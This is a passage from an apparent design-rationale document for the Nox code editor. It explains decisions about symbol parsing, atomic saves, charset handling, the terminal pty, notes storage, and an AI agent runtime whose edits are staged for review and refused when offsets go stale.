`EditorState` over a 39 KB JavaScript file of 1,000 functions, it stopped at
3,002 characters, and a plain read of it found 80 of the 1,000. Treat that as
an observation and not a constant: it follows from `Work.InitViewport`, a 3,000
in a `const enum` inlined into `@codemirror/language`'s build and exported
nowhere, so a version bump can move it and no test here pins it. What the tests
do pin is the shape of the problem: a fresh state over an ordinary document
is incomplete, a plain read caps well below the true count, and the palette's
budget can be exhausted.

So the palette asks for the whole document with a deadline,
`ensureSyntaxTree(state, doc.length, 100)`, and when that returns null it lists
what was parsed *and says the file is still parsing*. Listing the frontier
quietly was the option to avoid: a short list that looks complete tells you the
symbol is not there, which is worse than telling you nothing. The partial list
does not creep upward as you type, either. `syntaxTree` reads the snapshot
frozen at the last dispatch while `ensureSyntaxTree` mutates the cached
`ParseContext` without dispatching, so it sits at whatever the frontier held
until one call finishes inside the budget, and then it is the whole file at
once.

**"No symbols" is not one answer, so it does not get one sentence.** Four
things produce an empty list and they call for four different responses from
the reader: no parser exists for this language, a parser exists but has not
loaded yet, the budget above ran out before anything was found, or the file
genuinely has no structure. Only the last of those may say so.

The second is the one that bit. `EditorPane` attaches a grammar through a
dynamic import that resolves after the buffer is already on screen, so for a
moment there is a language id and no parser, and the first version of the list
said "No functions or classes in this file" about a file nothing had read yet.
No unit test could reach that window: they hand `fileSymbols` a parser
directly, or build an `EditorState` with the language already attached, and
neither goes near the dynamic import. It was found by opening a file in the
running app and pressing ⌘R before the import landed.

**Which of those four it is gets decided in `core/`, not in the component.**
`symbolListState` takes the four facts they are told apart by (a grammar
exists, it has loaded, the forced parse came back, how many symbols were found)
and names the state, the fifth being an ordinary list of symbols, partial or
not. `symbolRows` maps that to a sentence and does nothing else. The
order is the substance of the function, because a document with no parser
attached also comes back with no symbols: read after the parse facts, every
grammar state shows up as "no functions or classes in this file", which is the
bug above. That is testable and now tested, which it was not while it lived in
a Svelte file this repo had no harness for. It does now: see §7. "No file is
open" is the exception and stays in the component, settled before there is
anything to parse.

### Sticky scroll is a panel, and what pins is a pure function

Sticky scroll reads `core/symbols.ts`'s table too, so it never disagrees with
Go to Symbol about what counts as structure: declarations only, never `if`,
`for` or other control blocks.

**What pins is `stickyRows`, a pure function beside `fileSymbols`, not a
computation done inline in the extension.** It takes the symbol list, the top
visible line, the document and a cap, and returns rows outermost-first. There
is no `EditorView` in the signature, so it is tested against real parses with no
DOM, the same reason `symbolListState` was pulled out of `CommandPalette`.
Deciding which rows pin costs on the order of the symbol walk itself: about
0.012 ms on `src/app.ts` (2,690 lines, 67 symbols), against the walk's own
~1.378 ms. That is also why the symbol cache is one slot per `EditorView`
rather than one shared slot. Two views open on different files would otherwise
fight over a single cached parse.

**The strip is a CodeMirror panel (`showPanel`, `{ top: true }`), not a
floating overlay inside `.cm-scroller`.** A panel is positioned and sized by
CodeMirror itself, which accounts for it in the editor's own layout, so the
last line of the document is never hidden behind the strip, and there is no
`scrollTop` arithmetic of Nox's own to get wrong. An overlay is the more
familiar look and was considered; the panel is the version that cannot be
subtly mispositioned, at the cost of pushing the document down by a row
instead of floating over it.

### The session save latch

Services subscribe to workspace signals in the constructor, and `Signal`
notifies immediately on subscribe. Without a latch, those empty first values
race the restore and can overwrite a good session with `tabs: []`. `Session`
therefore ignores every save until `markReady()` is called at the end of boot.
(This bug was real and is covered by a regression test.)

A second, related trap lived in restore itself: it read the group layout into a
local, applied each group's active tab, then used that *same stale snapshot* to
pick the focused tab, so the focus always landed on whichever tab was opened
last rather than the one the session named. Restore now re-reads the layout
after mutating it. The original test could not catch this because its fixture
made the intended tab and the last-opened tab the same file.

### Quitting persists; it does not prompt

There is no "you have unsaved changes" dialog. A dirty file buffer records its
unsaved text and the mtime it was based on, and comes back dirty on next
launch, with ⌘Z reaching the content that is actually on disk. If the file
moved while Nox was closed, the buffer is flagged `modified` through the same
channel the watcher uses, so saving goes through the existing conflict path.

The reasoning is that a dialog can be answered wrong and slows down every quit
for the sake of the one case it exists to protect, whereas persistence cannot
lose work however the user dismisses the window. It also makes file buffers
behave like scratch buffers, which already worked this way.

This is what `Platform.onCloseRequested` exists for: the window is held open
until the final session write and settings flush complete. Before it, the only
persistence was the 400 ms debounced save, and `NoxApp.dispose()` was dead
code that nothing anywhere called.

### Programmatic edits go through change sets

`workspace.apply(spec)` is the single entry point for any edit Nox makes on the
user's behalf: today project replace and agents, later plugins. It validates
the *whole* set before dispatching anything: every buffer present, every
declared base revision current, and every buffer's `ChangeSet` successfully
built. That last step is load-bearing and easy to skip. CodeMirror throws on a
range the document cannot honour, so building transactions as you dispatch them
means a bad offset in the second buffer leaves the first already written. Doing
all the construction up front is what makes a half-applied set unrepresentable
rather than merely rare, and there is no rollback path because there is nothing
to roll back.

Overlapping edits to one buffer are refused too. CodeMirror merges them into
text nobody asked for, and silently inventing content is the failure this layer
exists to prevent.

Each buffer carries a monotonic `revision`, deliberately separate from
`changeCount`: the latter is zeroed by `resetState` for dirty tracking, and a
revision that can go backwards would let a caller holding revision 3 pass a
staleness check against a completely different document.

**Grouped undo indexes CodeMirror's history; it does not replace it.** Each
change-set transaction is annotated `isolateHistory: 'full'`, so it is exactly
one history event and never merges into adjacent typing. The workspace records
the `undoDepth` that event produced, and undoes a buffer only while that depth
still matches. Using CodeMirror's own accounting is what keeps this correct
across edits, undos and redos the workspace never saw. A second history of our
own would have to stay in step forever. A buffer the user has edited since is
skipped and reported, never silently taken back.

See [AGENT-PLATFORM.md](AGENT-PLATFORM.md) §2.

### The agent runtime is wiring, on purpose

`AgentRuntime` owns sessions; it owns no capability of its own. An agent reads
through `ContextService`, acts through `CommandRegistry` under
`PermissionService`, proposes through `ReviewService`, applies through
`workspace.apply`, runs under `JobRunner`, and is undone by `undoChangeSet`.

If the runtime ever needs a path around one of those, that is a bug in the
layer it went around, not a feature of the runtime.

The protocol in `agent/protocol.ts` is serialisable data rather than method
calls, because an agent is expected to be a separate process eventually and
designing for in-process first is how that stops being possible.
`AgentTransport` is the seam. Only the in-process implementation exists;
a supervised child process speaking the same messages over stdio is the same
interface with a JSON codec behind it, and is the honest remaining gap.

Exactly one protocol verb reaches a side effect: `command.execute`.
`proposal.stage` is not a command because a command is the thing that has an
effect, and staging has none.

See [AGENT-PLATFORM.md](AGENT-PLATFORM.md) §3.

### A file's charset is carried, never guessed

Nox refused anything that was not valid UTF-8. That protected the file, since
a guess that gets saved is corruption, but it meant a text editor that could
not open a text file. It now reads legacy charsets, and the shape is chosen so the
protection survives.

**The decoder is in Rust because it has to be.** The webview's `TextDecoder`
decodes legacy charsets; its `TextEncoder` only ever produces UTF-8. A decoder
in the renderer could open a windows-1252 file and then be structurally
incapable of writing it back as one, so the file would convert silently on its
first save. `encoding.rs` over `encoding_rs` does both directions.

**Detection stays honest.** A byte-order mark is a fact and valid UTF-8 is a
fact; nothing else is knowable, so `detect` returns them and refuses the rest.
The refusal is the feature. It is what routes the user to
`file.reopenWithEncoding` and the status-bar picker, where the person who
knows what the file is makes the call. UTF-16 with a mark is therefore the
only charset newly opened *automatically*; the rest are reachable by choice.

**Encoding refuses rather than substitutes.** `encoding_rs` writes an HTML
numeric reference for a character the charset cannot hold, so an emoji typed
into a Shift_JIS file would save as the literal `&#128512;`: corruption
wearing the face of a successful save. The refusal happens before the atomic
write begins, so the original survives it.

`nox_read_text_file` and `nox_write_text_file` stay strict: they are what
config, workspace settings and git read through, and UTF-8 or nothing is right
for Nox's own files. `save` writes with the buffer's charset and
`reloadFromDisk` pins it rather than re-inferring, because a legacy file has
nothing in it to infer from and re-guessing on every external write is exactly
where mojibake creeps in.

### Saves are written to a sibling, then renamed

`fs::write` truncates before it fills, so a crash, a power cut or a full disk
part-way through leaves the file empty and the old contents gone. Every save
goes to a temp file in the *same directory*, is flushed to the device, and is
then renamed over the target. That is atomic on every filesystem Nox targets,
so a reader sees the whole old file or the whole new one and never a torn one.

Same directory specifically: rename across filesystems is a copy, which would
put the truncation risk straight back. The old file's permissions are carried
across, and a symlink is followed so the link is not replaced by a regular
file. See `nox_write_text_file` in `src-tauri/src/fs.rs`.

### An agent may live in another process

`AgentTransport` has two implementations: `ProviderTransport` runs a
`ModelProvider` in this process, and `StdioTransport` talks to a child process
in line-delimited JSON, supervised by `src-tauri/src/agent.rs`.

The seam that matters is `Platform.spawnAgent`, which returns an
`AgentProcess`: send a line, subscribe to lines, subscribe to exit. The
transport is built from *that*, not from a command line, so it is testable
against a fake process: no fixture binary, and failure modes like a silent
agent or a crash mid-conversation become ordinary tests.

One rule in the contract is load-bearing: **an `AgentProcess` must buffer
output produced before a handler attaches.** A child can write its handshake
before `spawnAgent` returns, and dropping it loses the message every session
starts with.

Spawning is deliberately not reachable from the agent protocol. An agent
cannot start another agent. Only the user can, through configuration.

### One reader for every piped stream

Three threads read a child process's output: an agent's stdout and stderr in
`agent.rs`, and a language server's stderr in `lsp.rs`. All three go through
`agent::read_lines`, and sharing it is not tidiness. It is the fix for a
defect all three had.

`BufRead::lines()` yields `Err(InvalidData)` for a chunk that is not valid
UTF-8, so **one** stray byte ended a reader thread for good. On an agent's
stdout that cost the exit event too, because the `child.wait()` after the loop
blocks on a process that is still alive: the panel sat on "Working…" until Nox
was restarted. On a language server's stderr it was quieter and worse. Stdout
is byte-framed by `MessageStream` and was never affected, so the editor kept
working while the one channel that explains a misbehaving server went silent.
A cp1252 console needs a single accented character to produce either.

`read_lines` reads raw bytes and delegates UTF-8 reassembly to
`pty::Utf8Stream`, which already holds back a character a read boundary cut in
half and substitutes for bytes that can never become valid. What it adds is
the line splitting, and the CRLF strip that `BufRead::lines()` gave for free.

Its callback returns `ControlFlow`, and the two answers are not symmetric.
Agent stdout returns `Break` when an emit fails, because a failed emit means
the window is gone and there is nowhere to put another line. Both stderr
readers return `Continue` throughout: a pipe nobody empties eventually blocks
the process filling it, so a dead window is not a reason to stop draining one.

### The terminal is a pty, and that is not a detail

`agent.rs` already supervises child processes, so a terminal looks like it
should reuse it. It cannot, and the reason is the whole design.

Piped stdio is not a terminal. A shell handed pipes sees `isatty` return
false and turns itself off: no prompt redraw, no colour, no line editing. And
`vim` or `less` refuse to run at all. `src-tauri/src/pty.rs` uses
`portable-pty` so the kernel presents a real terminal, which is also why
Windows is not a special case in the renderer: a Windows pty is ConPTY, not a
file descriptor, and the crate hides that.

Two consequences follow, and both are visible in the code:

**Output is chunks, not lines.** A prompt, `$ `, has no trailing newline, so
the line-buffered reads that are right for an agent would hold the prompt back
until the user typed something: the terminal would look frozen at the exact
moment it was ready. The reader thread emits `nox://pty-data` with whatever
arrives.

**A chunk boundary lands anywhere, including mid-character.** `Utf8Stream`
holds an incomplete trailing sequence back for the next read. Without it, any
non-English output or box-drawing character has a chance of arriving as two
replacement glyphs. It is a pure struct precisely so this is testable. The
case is near impossible to provoke against a real shell and trivial to write
down.

The panel keeps the rest honest. It sits below the editor rather than taking
it over, because watching a build fail beside the code that failed is the
point. It is mounted once and hidden with CSS rather than unmounted, since
disposing the xterm.js instance would throw away the scrollback, and closing
the panel to glance at a file must not lose a build log. And `TerminalService`
deliberately does **not** store output: xterm.js already holds the scrollback,
and mirroring it into a signal would double the memory of a large `cat` for
nothing.

### Notes are not files, and are not stored like them

A note has no reader but the user. A file has git, a compiler, and an agent
staging a change set. That is why files get buffers, transactions, dirty
tracking and a watcher, and why notes get none of it. `NotesService` takes a
`Platform` and nothing else: with no workspace in reach, opening another
folder cannot change or hide notes, and no later edit can make it so by
accident.

Storage is a small `notes.json` index plus one `note-<n>.txt` per body. One
JSON holding everything was the obvious alternative and was rejected twice
over. It would rewrite every note on every keystroke, which is precisely the
write amplification session v3 caused and v4 undid. And it would put every
note behind one write: torn once, they are all gone. Split, a torn index costs
titles and ordering while the bodies survive, and a torn body costs one note.

The cost is real: two files to keep agreed, and a load that has to tolerate an
index naming a body that is not there. That case is handled by loading the
note with an empty body rather than dropping it. The title is still worth
keeping.

Notes leave Nox as Markdown, and the front matter is **not YAML**. No YAML
parser ships and none was added for this: hand-rolling a subset of a
whitespace-significant format is how importers rot. `core/note-file.ts` writes
one `key: value` per line where the value is JSON. `stringify` out,
`parse` in, exact in both directions, and still readable as front matter by a
person. Gaining compatibility with other note tools is a decision worth making
on its own evidence, not one to smuggle in through an export format.

Anything the parser does not recognise becomes **body**, never an error and
never a reason to skip a file: plain Markdown from elsewhere imports as a
note, and a file carrying real YAML imports with its metadata visible in the
text, which a person can fix by hand. A file that is silently dropped is just
gone.

Import **always adds**. Files carry the id they were exported with, so
honouring it would make re-importing your own backup rewrite every note in
place. Merging needs a conflict UI and a rule for which side wins; adding
needs neither, and a duplicate note is a nuisance where an overwritten one is
a loss. Filenames are the title slugified, with the note's ordinal appended on
collision. Titles are user-edited and not unique, and two notes sharing a path
means exporting four notes and finding three files.

Both commands are the first notes commands to leave Nox's own config
directory, so they are also the first to declare `capabilities`:
`fs.create` and `fs.read`. They need a folder picker, which the browser build
does not have, and are greyed there rather than hidden: a greyed command
explains itself, a missing one does not.

A note can point at code, and `NotesService` still cannot reach a workspace.
An anchor is three primitives (a path, a line, the anchored text) stored
verbatim and interpreted by nothing in that module. `app.ts` resolves them,
because it already holds both services and already splits this way for
`notes.rename`. This is what lets the feature exist without giving the service
the workspace its isolation depends on not having.

Two failure modes are designed for rather than ignored. **Drift:** a line
number alone rots, because inserting above an anchor makes it point at the
wrong code *silently*, which is worse than pointing nowhere, since it still
looks right. `core/anchor.ts` re-finds the snippet outward from the remembered line,
so a non-unique one (`}` appears hundreds of times) lands on the nearest copy;
past a 500-line window the remembered line is the safer answer, and only that
window is read, so the cost is the same on a 10 MB file.

**The anchor corrects itself rather than merely being re-guessed.** When it
resolves against real text, on selecting the note and on following the chip,
a found line is written back, so the chip names where the code *is* and the
anchor stops rotting. Only when the snippet was actually found: a fallback is
the neighbourhood the code used to be in, and persisting one would overwrite
the last thing anyone knew with a guess. Both triggers are discrete user
actions, deliberately: the buffer's revision changes on every keystroke, so
deriving the label from the file's text would put a scan on the typing path
for something nobody reads while typing. The cost of that choice is that the
chip can go stale while a note stays selected and its file is edited
underneath. Following it still lands correctly, and reselecting corrects the
label. **The wrong folder:**
an anchor into a folder that is not open greys its chip and the note is
otherwise untouched. Dropping the anchor there would let opening a folder
mutate notes, which is precisely what the service's isolation forbids. Doing
it in the panel instead would not make it acceptable.

Anchors are one-way. A note knows its code; the code does not know its notes.
A gutter marker means pushing note state into the editor and the tree, and
buys less than it costs until anchors have been used enough to know whether
they are kept up to date.

Finding a note is a **view** concern, and stays one. `load()` reads every body
into the signal, so the whole corpus is already in memory and filtering is a
pure function over it. That is `core/note-search.ts`, which is where the
matching and the snippet can be tested without a DOM. A search index inside `NotesService`
would be state to keep agreeing with the notes, bought for nothing at this
size.

The filter box matches **substrings**; the `note-open` palette matches
**fuzzily**. That is not an inconsistency. A palette is for naming a note you
already have in mind, where a subsequence match reads as mind-reading; a filter
box is for narrowing, and `sl` matching `shopping list` means the query can
never be narrowed. Pinning is the only thing that reorders the list, and it is
user-driven: `create()` still decides the order, and sorting by a timestamp
would move rows while they are being typed into.

A note's dirty flag is cleared **before** its write, not after. The
difference is not stylistic: clearing afterwards means the write has to prove
that what it wrote is still what the note says, which took a revision counter
per kind of dirtiness and a saved-revision shadow to compare against. Clearing
first inverts it. The flag is false for as long as the write is in flight, so
an edit landing during it re-arms the flag by itself and is unambiguously
newer than the data being written. A failed write re-arms the flag on its way
out, which is why the per-call failure fences matter more under this scheme
rather than less: without them a failing write would be picked straight back
up by the same drain loop.

Notes always autosave, on a 400 ms debounce, and do not follow
`files.autoSave`. That setting exists because writing a file is an
outward-facing act with other observers; a note has none. There is no setting
of its own either, because a preference that stops saving your notes is a
preference that loses them.

### Provenance is state, not a view

Search highlighting is a `ViewPlugin` because matches are *derivable*: given
the query and the document, you can always recompute them. Provenance is not.
Once a change set is applied, nothing in the document remembers who did it, so
it has to be recorded as it happens and carried forward, which makes it a
`StateField` holding a `RangeSet`, mapped through every later change by
CodeMirror rather than by hand.

The alternative was a position index maintained in the workspace. It would
have reimplemented `RangeSet.map` and forced the workspace to intercept every
transaction to keep it current. Putting it in state also means background
buffers accumulate provenance correctly, because the workspace updates their
state whether or not a view exists.

Two costs are real. A user's edit has to *subtract* its own changed ranges,
because CodeMirror's default mapping extends a mark when you type inside it,
the opposite of "touching a line takes ownership of it". And the field must
stay out of the settings `Compartment`: reconfiguring a compartment to nothing
removes its extensions, and removing a `StateField` destroys what it holds, so
only the gutter and the tooltip are gated by `workbench.showChangeMarks`.

Marks live for the session and no longer, for the same reason the transaction
log does: persisting them would decouple provenance from undoability, and a
`git checkout` or an external formatter would leave attribution that is
confidently wrong. A mark that lies is worse than no mark.

### The first provider is local, and parses prose

`ModelProvider` shipped in v0.2 with no implementation, deliberately. This is
the first one, and what it had to become says something about local models.

Network access lives in Rust behind `Platform.streamJsonLines`, loopback-only.
The webview could not do it anyway, since the CSP is `default-src 'self'` with
no `connect-src`, and widening that to reach one port would open the app's
network surface permanently.

Two findings shaped the provider, both measured before it was written rather
than assumed. **There is no `tool_calls` field.** `qwen2.5-coder` advertises
`tools` in `ollama show` and never produces one, so actions arrive as JSON
inside the message content and the provider parses them, including stripping
code fences the model applies inconsistently between turns of one
conversation. Building on native tool calls would have worked with an
unknowable subset of models and failed opaquely for the rest.

**And the model cannot compute character offsets.** Given `proposal.stage`'s
real interface it produced a zero-width insertion of a whole function body:
the intent right, the arithmetic nonsense. That is the dangerous shape:
`proposal.stage` would accept it and the review panel would render a
convincing corrupt diff. So the model quotes text instead, and the provider
converts the quote to offsets against the text the model was shown when it
read the buffer, refusing anything it cannot find there or that matches twice.
The protocol is untouched; everything below the provider still receives real
offsets and never learns a model was involved.

Resolving against what the model read is the only thing the provider *can* do,
since text is its whole window on the buffer, and it is not sufficient on its
own, because the user goes on typing while the model thinks. Offsets computed
before a keystroke are arithmetically fine and land in the wrong place: one
space typed at line 1 between a read and a stage turned a rename into
`export function product(a, b) {{`, rendered as a clean one-hunk diff with the
agent's name on it. So freshness is enforced in the runtime, which sees both
halves: it remembers the revision a buffer was at when the session first read
it, and refuses `proposal.stage` for a buffer that has moved since, as a
`stale` error the agent is told about and can clear with a fresh whole read.
`ReviewFile.baseRevision` does not cover this. It is captured at stage time,
which is after the drift.

Two reads establish that baseline, because two hand back a position in the
text: `context.bufferText`, and `context.selection`, which returns each range's
offsets and the text at them, which is everything "uppercase my selection"
needs.

The rest establish nothing. A viewport, a path tree and a change-set list
locate no text at all. `context.openBuffers` is a deliberate trade rather than
a claim that a listing is harmless: filing every open buffer at once, on the
listing most sessions start with, would refuse the honest sequence of listing,
the user typing, reading a range and staging from it. A false refusal breaks
working agents silently, which is worse than the hole it closes. The
hole is real and worth naming: `BufferSummary.length` *is* the end-of-document
offset, so a session that lists a buffer and appends to it stages against a
position that may have moved, with nothing to refuse it.

Only a read that hands back the whole document may *refresh* the baseline; a
narrower one establishes it without raising it. The asymmetry is the point: a
narrow read proves the agent looked at part of the buffer, not that the offsets
it is about to stage came from the current text, so letting one raise the
baseline would re-bless stale offsets on a revision that had caught up. Whole
is settled by comparing the read's answer to what a plain read returns rather
than by inspecting the parameters, so a range that happens to span the
document counts as whole however the parameters spell it, and does refresh.
Refresh itself trusts the agent to stage from its most recent read: a session
that reads, lets the buffer move, reads again and then stages offsets from the
*first* read is not refused by this guard, because the baseline has caught up
with the buffer. Only the agent knows which read it computed from, which is
what the declaration below is for.
The comparison is used because the reader clamps the range and reads a missing
`lines` as
the whole document, so `lines: null` and a span past the end are whole reads
that a parameter test files as narrow, and only a comparison cannot drift.

Inference stops there. A buffer for which the session called neither of those
two reads, and listing it does not count, has offsets from somewhere the
runtime cannot see, and no rule over what it *watched* distinguishes the read an agent
computed from among several. So `proposal.stage` gained an optional
`baseRevisions`: buffer id to revision, the same field `ChangeSetSpec` has
always had, in the plain-JSON shape the wire can carry. Any declared entry the
buffer is no longer at refuses the stage, under the same `stale` code, and that
includes an entry for a buffer no edit names. `workspace.apply` reads the
field that way, and an agent that read a file and concluded it needed no edit
has a conclusion that goes stale when the file moves. A declared entry for a
buffer that is not open at all refuses too, under `not-found` rather than
`stale`, since there is no revision on record to compare against.

It is checked **in addition to** the read tracking, never instead of it: an
agent that declares the current revision while holding offsets from an older
read is describing a check it did not do, and the baseline still refuses it.
A malformed declaration refuses too, rather than being ignored. An agent that
sent one believes it is protected, and staging anyway hands it a guarantee it
does not have.

What the declaration does *not* do is make agents safe. It is optional,
because requiring it would break every agent already written, so an agent that
omits it is exactly where it was. And for a buffer the session never read, the
declaration is the only check there is: an agent that declares a revision it
did not compute against has nothing to catch it. The field lets an honest agent
prove freshness; it cannot make a careless one honest.

Failures surface as failures, and that too is the provider's job rather than
the seam's. A refused connection and a server that rejects the request are
both ordinary first-run experiences: the model name has a typo, or nothing is
listening. A session that reported success for either would be worse than one
that crashed. So the provider throws, naming the configured host or
quoting the server's own words, and the session ends `Failed` with the message
in its audit trail. `http.rs` stays ignorant of what an error body looks like:
it forwards a status and an opaque string, and the knowledge of which field
carries the message lives with the vendor-specific code that already knows the
request shape.

The cost is a parser where a schema would have done, and a vocabulary the
model is told about in prose rather than declared. That is the price of local
models as they are, not as their APIs describe them.

### Selection edits are composition; the scope only ever defaults a checkbox

`agents.runOnSelection`, **Edit Selection with a Model…**, adds no new
machinery. The session, the audit trail, the provenance author, the
permission model, job cancellation and the stale-read guard all come from
`AgentRuntime` unchanged, and the result lands in `ReviewService` exactly as
any other proposal's does. What is new is two things: the selection reaching
the model through `brief()`, and a scope that changes a hunk's default in
`review.stage`.

`SessionOptions` gains `scope?: ReviewScope`, a `{ bufferId, fromLine, toLine }`
captured in `app.ts` before the instruction is even typed, so it describes
where the user was looking when they ran the command rather than where they
are by the time the model answers. `review.stage(spec, scope)` uses it to
flip one thing: a hunk whose line range does not touch the scope starts
`accepted: false` instead of the panel's usual `true`, labelled *outside your
selection* rather than left to look unexplained.

**The scope only ever decides a default.** It does not refuse a stage, does
not block one, and does not itself read the buffer. That is what keeps it
out of the stale-read guard's way, which does refuse: the guard compares the
revision a session read against the revision the buffer is now at and rejects
a stage that has fallen behind. A scope captured against a selection that has
since moved costs nothing sharper than a checkbox defaulted the wrong way,
confirmed in the walk, where the identical request against the identical
buffer, once through **Edit Selection with a Model…** and once through a
plain `Run Agent…`, staged the same hunk and differed only in which side the
checkbox started on.

The alternative was to refuse a hunk outside the scope outright rather than
merely default it unkept. Rejected: a companion edit is often the correct one,
whether a new import for a change requested in the middle of a file or the
other half of a rename the model reached for on its own, and refusing it would
mean refusing the model for doing the right thing. Defaulting it unkept keeps
that judgment with the person reading the diff instead of pre-empting it.

`brief()` was the one place this needed a real finding rather than plumbing.
Every `context.*` method addresses a buffer by `bufferId`, never by name; the
brief, before this branch, named files and never gave their ids. Driving the
feature against a real model surfaced exactly that gap: asked to rewrite the
selection and update a comment on line 1, the model addressed the buffer by
the only name it had been shown, got "Buffer shapes.js not found." back
eleven times, and stopped at the turn cap having done nothing. Fixed by
rendering each file as `name [id]`, brackets used for nothing else in the
brief, so the identifier every `context.*` call needs sits next to the name a
person would use. No unit test caught this, because every scripted provider in
the suite passes ids by construction. That is what the walk was for.

`brief()` is on the record, and it took a second pass to get there. It
originally read straight off `ContextService`, skipping the
`context.reader(principal)` proxy every other read goes through. Understandably,
since the brief is assembled before any request exists and `#handle` binds that
proxy per request. The effect was that up to `SELECTION_MAX_CHARS` (8,000)
characters of the user's code opened a session having been recorded nowhere.
Not a security hole. The text leaves the machine only once `net.request` is
granted, which the commands that can reach the network declare as of
2026-08-31 and did not before, and a model could read the same buffer through
the recorded API anyway. But `reads` is meant to be the whole account of what a session saw,
and it was not.

It now takes a principal and reads through the proxy, and a session records a
`brief` action naming the buffer and how much text went with it. That action
is its own `AgentAction` variant rather than a `read`: the trail means *what
the agent did*, and the brief is what Nox handed it unasked. Filing one as the
other would misattribute the thing being made honest. It is recorded only when
a selection was carried. Open-file names and line counts were always in the
brief, and a line on every session for those would bury the case the record
exists for.

### A prose answer is a different question, not a different agent

**Ask About Selection…** and **Explain Selection** reuse what the edit path
reuses (the session, the job, cancellation, the audit trail, the permission
model, the brief and the selection inside it) and change exactly one thing:
what Nox asks for back. The one place that could not be composition was the
provider, and the reason is a defect rather than a design.

`OllamaProvider`'s loop is action-mandatory. `parseTurn` splits each reply
into narration and one JSON action, and a reply that is pure prose returns no
action and the error *no JSON object in the reply*. An actionless turn
increments `consecutiveFailures`, pushes `Reply with one JSON object` back at
the model, and **on the second one throws**, which the runtime turns into a
`failed` session. So a model asked to explain something did the obvious right
thing, was corrected twice for it, and Nox reported its own feature as a
broken model. The explanation was not even lost: it was yielded as narration
and filed in the trail as a `note`, where nobody is looking for an essay.

No prompt fixes that, and the shape of the failure is why. The loop cannot
terminate on a turn that produced no action, so an instruction that persuades
the model to answer in prose is an instruction that makes the failure certain
rather than merely likely. It was also invisible to the suite for a structural
reason: every scripted provider yields the actions its test wrote, so no test
can reach a turn that produced none. Same class as the `name [id]` defect
above, found the same way, and the argument for walking this line of features
against a real model rather than a fake one.

So `complete` branches once, at the top, on `expects === 'prose'`: one round
trip, the assembled reply as a single `text` chunk, no `parseTurn`, no turn
cap, no JSON anywhere. The failure stops existing by construction rather than
by instruction, and the model is asked for the one thing every model does
well. The cost is that the answer arrives whole rather than progressively.
`#ask` accumulates the streamed frames and resolves with the content, and
exposing partial text means rebuilding it as a channel the generator pumps.
Real complexity, for an answer the user waits out either way; the session
simply reads as working until it lands.

**The field says what Nox wants back, never who is answering.** That is what
keeps the seam vendor-neutral: `expects?: 'actions' | 'prose'` is a statement
about the reply, so a provider with no notion of a prose mode can ignore it,
and no vendor's name reaches the interface. Absent means actions, so an agent
written before the field is exactly where it was and `ScriptedProvider` needed
no change at all. It threads onto the wire too, in `Outbound`'s `run`, rather
than stopping at the in-process transport. Telling a child process the
session is one thing while the runtime treats it as another is a lie that
surfaces later as an unexplained refusal.

Two alternatives cost more. Asking the model to put its answer in a
`session.summary` string needs no interface change at all, and asks a small
local model to fit multi-paragraph prose (newlines, quotes, backticks,
fences) inside a JSON string. That is the surface the provider section
above already records as unreliable, where the model strips code fences
inconsistently between turns of one conversation; an explanation of code is
the prose *most* likely to contain a fence, and the failure mode is a failed
session rather than a worse answer. A second provider method costs what
`provider.ts` argued in advance that it costs: a second code path exercised
only by the slow providers, and two implementations owed by every provider
written after it.

**A prose session refuses every request but `session.note` and
`session.summary`**, with `invalid-request`, and it refuses in
`AgentRuntime.#handle` rather than in the prompt. A prompt only constrains a
model that reads it; `#handle` is where an out-of-process agent's requests
arrive as well, so refusing there is what makes *"explain this" cannot edit
anything* a property of the runtime instead of an intention of the provider's.
It is worth a branch precisely because the command sounds harmless: someone
auditing what they let a model do would not think to check the session that
only asked a question.

**The answer is published, not recorded.** Text chunks in a prose session
accumulate into the session's `answer` and are deliberately not also filed as
`note` actions. The trail means *what the agent did*, and an essay in it would
bury the reads the trail exists to show. That is the same distinction the
`brief` variant above draws, made the same way and for the same reason. The panel
reads `answer` off the snapshot the runtime already publishes; a separate
`AnswersService` mirroring that state would be a second history to keep in
step forever, which is the shape rejected for grouped undo.

**Answers live for the session and no longer**, which is provenance's rule and
provenance's reason. A mark that lies is worse than no mark, and an
explanation of code that has since changed is exactly such a mark; persisting
answers would mean a `git checkout` quietly turning a shelf of them into
confident nonsense. They already live in the runtime's session list, whose
lifetime is precisely this, so nothing new persists and nothing new has to be
cleaned up. Within a session,
where the answer is still worth reading and only *might* have gone stale, the
panel labels rather than refuses: the revision recorded when the brief was
built against the buffer's revision now, with `-1` reported as *file is
closed* rather than folded into *changed*, because a file you closed is not a
file you edited. That comparison is why `BufferSnapshot` gained `revision`.
`revisionOf(id)` answers the same question, but a component cannot subscribe
to a method call, so a panel calling it would have gone on claiming an answer
was current through every edit that did not happen to re-render it.

**Rendering stops at fenced code**, and stopping is the decision rather than
the shortfall. A markdown renderer is a dependency and a sanitisation surface
aimed at model output, bought for a feature whose entire value is a paragraph
of text. So the answer is split on triple backticks, every run is rendered as
text through Svelte interpolation, `innerHTML` appears nowhere, and emphasis
and headings arrive as the characters the model typed. The bound was drawn so
that every way the splitter can be wrong shows content in the wrong style
rather than showing none, which is what an earlier version did, matching a
fence's info string whether or not a block had opened, so an inline fence
tagged `json` ate the word after it. A deliberately bounded renderer may
render prose plainly; it may never swallow it.

### A review narrows the change set; it does not apply hunks

`ReviewService.stage(spec)` computes what each buffer *would* say and diffs it
against what the buffer says now. CodeMirror states are immutable, so working
out the result costs a transaction that is computed and thrown away: no
dispatch, no history entry, nothing on screen.

The panel covers the editor, so it can be put away without deciding: Escape (or
Close) hides it and keeps the staged set, going to any file does the same, and
the status bar offers it back. Apply and Discard remain the only two ways to
resolve it. Neither should be reachable by accident, and neither should be the
only way to look at the file you are reviewing.

Accepting a subset does **not** apply those hunks individually. The accepted
hunks are converted back into offsets and handed to `workspace.apply` as one
change set, so the reviewed result lands in a single transaction and one ⌘Z
takes it back. Applying per hunk would reintroduce exactly the partially-applied
state the transaction layer exists to make unrepresentable.

The diff lives in `core/diff.ts`: Myers' O(ND) algorithm over lines, with the
common prefix and suffix trimmed first. `splitLines` keeps each line's
terminator, which makes `lines.join('')` exact and makes a line index equal to a
CodeMirror line number minus one; that is what keeps newline handling out of the
offset arithmetic entirely.

See [AGENT-PLATFORM.md](AGENT-PLATFORM.md) §2.3.

### The context API hands out data, never handles

`ContextService` is the read side of the platform: buffer summaries, text by
line range, selections, live viewports, the workspace tree, recent
transactions. Everything it returns is plain data that survives
`JSON.stringify`, never a `Buffer`, an `EditorState` or a `Signal`.

That is a correctness property, not a style preference. Every mutation is
supposed to go through `workspace.apply` under the permission model, so a
